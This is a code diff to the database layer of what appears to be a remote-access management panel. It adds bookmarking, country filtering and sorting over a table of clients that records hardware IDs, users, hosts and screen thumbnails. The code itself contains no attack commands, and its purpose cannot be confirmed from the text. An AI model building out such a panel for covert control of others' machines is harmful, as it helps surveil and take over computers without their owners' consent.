@@ -27,7 +27,8 @@ db.run(`
     country TEXT,
     last_seen INTEGER,
     online INTEGER,
-    ping_ms INTEGER
+    ping_ms INTEGER,
+    bookmarked INTEGER NOT NULL DEFAULT 0
   );
 `);
 try {
@@ -47,6 +48,9 @@ try {
 } catch {}
 try {
   db.run(`ALTER TABLE clients ADD COLUMN custom_tag_note TEXT`);
+} catch {}
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN bookmarked INTEGER NOT NULL DEFAULT 0`);
 } catch {}
 db.run(
   `CREATE INDEX IF NOT EXISTS idx_clients_online_last_seen ON clients(online, last_seen DESC);`,
@@ -294,6 +298,7 @@ export function listClients(filters: ListFilters): ListResult {
     sort,
     statusFilter,
     osFilter,
+    countryFilter,
     allowedClientIds,
     deniedClientIds,
   } = filters;
@@ -319,6 +324,11 @@ export function listClients(filters: ListFilters): ListResult {
     params.push(osFilter);
   }
 
+  if (countryFilter && countryFilter !== "all") {
+    where.push("UPPER(COALESCE(country,'ZZ'))=?");
+    params.push(countryFilter.toUpperCase());
+  }
+
   if (Array.isArray(allowedClientIds)) {
     if (allowedClientIds.length === 0) {
       where.push("1=0");
@@ -336,17 +346,22 @@ export function listClients(filters: ListFilters): ListResult {
   const whereSql = where.length ? `WHERE ${where.join(" AND ")}` : "";
 
   const orderBy = (() => {
+    const bookmark = "bookmarked DESC";
     switch (sort) {
       case "ping_asc":
-        return "ORDER BY ping_ms IS NULL, ping_ms ASC";
+        return `ORDER BY ${bookmark}, ping_ms IS NULL, ping_ms ASC, id ASC`;
       case "ping_desc":
-        return "ORDER BY ping_ms IS NULL, ping_ms DESC";
+        return `ORDER BY ${bookmark}, ping_ms IS NULL, ping_ms DESC, id ASC`;
       case "host_asc":
-        return "ORDER BY LOWER(COALESCE(nickname, host)) ASC";
+        return `ORDER BY ${bookmark}, LOWER(COALESCE(nickname, host)) ASC, id ASC`;
       case "host_desc":
-        return "ORDER BY LOWER(COALESCE(nickname, host)) DESC";
+        return `ORDER BY ${bookmark}, LOWER(COALESCE(nickname, host)) DESC, id ASC`;
+      case "country_asc":
+        return `ORDER BY ${bookmark}, LOWER(COALESCE(country, 'zz')) ASC, id ASC`;
+      case "country_desc":
+        return `ORDER BY ${bookmark}, LOWER(COALESCE(country, 'zz')) DESC, id ASC`;
       default:
-        return "ORDER BY last_seen DESC";
+        return `ORDER BY ${bookmark}, last_seen DESC, id ASC`;
     }
   })();
 
@@ -362,7 +377,7 @@ export function listClients(filters: ListFilters): ListResult {
 
   const rows = db
     .query<any>(
-      `SELECT id, hwid, role, host, os, arch, version, user, nickname, custom_tag as customTag, custom_tag_note as customTagNote, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs
+      `SELECT id, hwid, role, host, os, arch, version, user, nickname, custom_tag as customTag, custom_tag_note as customTagNote, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs, bookmarked
        FROM clients
        ${whereSql}
        ${orderBy}
@@ -387,6 +402,7 @@ export function listClients(filters: ListFilters): ListResult {
     country: c.country || "ZZ",
     pingMs: c.pingMs ?? null,
     online: c.online === 1,
+    bookmarked: c.bookmarked === 1,
     thumbnail: getThumbnail(c.id),
   }));
 
@@ -589,6 +605,32 @@ export function recordAutoScriptRun(scriptId: string, clientId: string) {
 export function clientExists(id: string): boolean {
   const row = db.query<any>(`SELECT id FROM clients WHERE id=?`).get(id);
   return !!row?.id;
+}
+
+export function listDistinctCountries(): { code: string; count: number }[] {
+  const rows = db
+    .query<{ code: string; count: number }>(
+      `SELECT UPPER(COALESCE(NULLIF(country, ''), 'ZZ')) as code, COUNT(*) as count
+       FROM clients
+       GROUP BY UPPER(COALESCE(NULLIF(country, ''), 'ZZ'))
+       ORDER BY count DESC`,
+    )
+    .all();
+  return rows.map((r) => ({ code: r.code, count: Number(r.count) || 0 }));
+}
+
+export function setClientBookmark(id: string, bookmarked: boolean): boolean {
+  const result = db.run(
+    `UPDATE clients SET bookmarked=? WHERE id=?`,
+    bookmarked ? 1 : 0,
+    id,
+  );
+  return ((result as any)?.changes || 0) > 0;
+}
+
+export function getClientBookmark(id: string): boolean {
+  const row = db.query<{ bookmarked: number }>(`SELECT bookmarked FROM clients WHERE id=?`).get(id);
+  return row?.bookmarked === 1;
 }
 
 export interface BuildRecord {
